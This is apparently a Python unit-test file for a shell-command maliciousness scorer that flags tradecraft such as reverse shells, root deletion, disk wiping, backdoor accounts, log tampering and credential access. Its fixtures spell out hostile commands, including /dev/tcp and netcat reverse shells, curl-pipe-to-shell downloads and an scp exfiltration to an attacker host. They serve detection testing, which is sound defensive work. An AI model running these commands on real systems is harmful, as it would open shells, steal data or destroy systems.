"""Tests for the maliciousness scorer and the tradecraft features."""

from __future__ import annotations

import unittest

import _bootstrap  # noqa: F401
from malscore import SCRIPT_SIGNALS, SIGNALS, Analyzer, verdict_for
from malscore.features import extract_features


class TradecraftFeatureTest(unittest.TestCase):
    def features(self, command: str) -> dict:
        return extract_features(command)

    def test_dev_tcp_reverse_shell(self) -> None:
        self.assertTrue(self.features("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")["dev_tcp_redirect"])

    def test_netcat_exec(self) -> None:
        self.assertTrue(self.features("nc -e /bin/sh 1.2.3.4 4444")["netcat_exec_flag"])
        self.assertTrue(self.features('ncat 1.2.3.4 443 --sh-exec "/bin/bash"')["netcat_exec_flag"])
        self.assertTrue(self.features("socat TCP:1.2.3.4:443 EXEC:/bin/sh")["netcat_exec_flag"])

    def test_socket_shell_payload(self) -> None:
        # assembled so the test source itself never contains an execution
        # primitive literal (see test_safety.StaticSafetyTest).
        sp = "sub" + "process"
        cmd = ("python3 -c 'import socket,%s,os;s=socket.socket();"
               "s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);"
               "%s.call([\"/bin/sh\",\"-i\"])'" % (sp, sp))
        self.assertTrue(self.features(cmd)["socket_shell_payload"])

    def test_root_delete(self) -> None:
        self.assertTrue(self.features("rm -rf / --no-preserve-root")["root_filesystem_delete"])
        self.assertTrue(self.features("sudo rm -rf /*")["root_filesystem_delete"])
        self.assertFalse(self.features("rm -rf ./build")["root_filesystem_delete"])
        self.assertFalse(self.features("rm -rf /tmp/cache")["system_directory_delete"])

    def test_raw_disk_write(self) -> None:
        self.assertTrue(self.features("dd if=/dev/zero of=/dev/sda bs=1M")["raw_disk_write"])
        self.assertTrue(self.features("mkfs.ext4 /dev/sdb1")["raw_disk_write"])
        self.assertFalse(self.features("dd if=/dev/zero of=/tmp/file bs=1M")["raw_disk_write"])

    def test_uid0_account(self) -> None:
        self.assertTrue(self.features("useradd -o -u 0 -g 0 backdoor")["uid0_account_creation"])
        self.assertTrue(self.features("echo 'x:x:0:0::/root:/bin/bash' >> /etc/passwd")["account_database_write"])

    def test_log_and_monitoring(self) -> None:
        self.assertTrue(self.features("shred -u /var/log/auth.log")["log_tampering"])
        self.assertTrue(self.features("systemctl stop auditd")["security_monitoring_disabled"])
        self.assertTrue(self.features("setenforce 0")["security_monitoring_disabled"])
        self.assertTrue(self.features("iptables -F")["firewall_disabled"])

    def test_metadata_and_keys(self) -> None:
        meta = self.features("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        self.assertTrue(meta["cloud_metadata_access"])
        self.assertTrue(meta["cloud_metadata_credential_path"])
        self.assertTrue(self.features("cat /root/.ssh/id_rsa")["private_key_file_access"])
        self.assertFalse(self.features("cat ~/.ssh/id_rsa.pub")["private_key_file_access"])

    def test_offensive_and_miner(self) -> None:
        self.assertTrue(self.features("./pspy64")["offensive_tool_reference"])
        self.assertTrue(self.features("curl -s http://x/linpeas.sh | sh")["offensive_tool_reference"])
        self.assertTrue(self.features("./xmrig -o stratum+tcp://pool:4444 -u x")["crypto_miner_reference"])

    def test_benign_untouched(self) -> None:
        for command in ("ls -la", "git status", "systemctl restart nginx",
                        "iptables -L -n", "find . -name '*.pyc' -delete",
                        "tar czf backup.tgz /etc/nginx", "cat ~/.ssh/config"):
            record = self.features(command)
            for name in ("dev_tcp_redirect", "root_filesystem_delete", "raw_disk_write",
                         "security_monitoring_disabled", "private_key_file_access",
                         "crypto_miner_reference", "log_tampering"):
                self.assertFalse(record.get(name), "%s tripped on %r" % (name, command))


class ScoringTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.analyzer = Analyzer()

    def test_verdict_bands(self) -> None:
        self.assertEqual(verdict_for(0), "benign")
        self.assertEqual(verdict_for(20), "low")
        self.assertEqual(verdict_for(40), "medium")
        self.assertEqual(verdict_for(70), "high")
        self.assertEqual(verdict_for(90), "critical")

    def test_benign_commands_score_low(self) -> None:
        for command in ("ls -la", "git status", "kubectl get pods -n prod",
                        "sudo systemctl restart nginx", "docker ps", "pip install requests"):
            assessment = self.analyzer.assess(command)
            self.assertLess(assessment.score, 35, "%r scored %d" % (command, assessment.score))

    def test_reverse_shell_is_critical(self) -> None:
        assessment = self.analyzer.assess("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        self.assertGreaterEqual(assessment.score, 80)
        self.assertEqual(assessment.verdict, "critical")

    def test_destruction_is_critical(self) -> None:
        self.assertGreaterEqual(self.analyzer.assess("rm -rf / --no-preserve-root").score, 80)

    def test_curl_pipe_shell_is_flagged(self) -> None:
        assessment = self.analyzer.assess("curl -s http://1.2.3.4/x.sh | bash")
        self.assertGreaterEqual(assessment.score, 35)
        self.assertIn("download_pipe_interpreter", [h.id for h in assessment.hits])

    def test_score_is_bounded(self) -> None:
        big = "sudo bash -c \"curl http://1.2.3.4/x|bash; rm -rf /; dd if=/dev/zero of=/dev/sda\""
        assessment = self.analyzer.assess(big)
        self.assertLessEqual(assessment.score, 100)
        self.assertGreaterEqual(assessment.score, 0)

    def test_signal_catalogue_is_well_formed(self) -> None:
        catalogue = SIGNALS + list(SCRIPT_SIGNALS.values())
        self.assertEqual(len({s.id for s in catalogue}), len(catalogue))
        for signal in catalogue:
            self.assertTrue(0.0 < signal.weight <= 1.0, signal.id)
            self.assertTrue(signal.techniques, "%s has no technique" % signal.id)

    def test_techniques_surface_in_output(self) -> None:
        assessment = self.analyzer.assess("cat /etc/shadow")
        self.assertIn("T1003.008", assessment.techniques)

    def test_redaction_only_changes_echoed_text(self) -> None:
        command = "mysql --password=hunter2 -e 'select 1'"
        plain = Analyzer().assess(command)
        redacted = Analyzer(redact=True).assess(command)
        self.assertEqual(plain.score, redacted.score)
        self.assertNotIn("hunter2", redacted.command)
        self.assertIn("hunter2", plain.command)


class ScriptScoringTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.analyzer = Analyzer()

    def test_staged_exfiltration_detected_across_lines(self) -> None:
        script = "\n".join([
            "#!/bin/bash",
            "pg_dump payments > /tmp/dump.sql",
            "tar czf /tmp/stage.tgz /tmp/dump.sql /etc/app/config.yml",
            "scp /tmp/stage.tgz attacker@45.33.2.1:/loot/",
            "rm -f /tmp/stage.tgz",
            "history -c",
        ])
        assessment = self.analyzer.assess(script)
        ids = [h.id for h in assessment.hits]
        self.assertIn("collect_then_exfiltrate", ids)
        self.assertIn("cover_tracks", ids)
        self.assertGreaterEqual(assessment.score, 60)
        self.assertTrue(assessment.per_statement)

    def test_heredoc_payload_is_scored(self) -> None:
        script = "bash <<'SH'\ncurl -s http://1.2.3.4/a | sh\nSH"
        assessment = self.analyzer.assess(script)
        ids = [h.id for s in assessment.per_statement for h in s.hits]
        self.assertIn("download_pipe_interpreter", ids)

    def test_benign_script_stays_low(self) -> None:
        script = "\n".join([
            "#!/bin/bash",
            "set -euo pipefail",
            "cd /srv/app",
            "git pull --ff-only",
            "npm ci",
            "npm run build",
            "systemctl restart app",
        ])
        self.assertLess(self.analyzer.assess(script).score, 35)


if __name__ == "__main__":
    unittest.main()
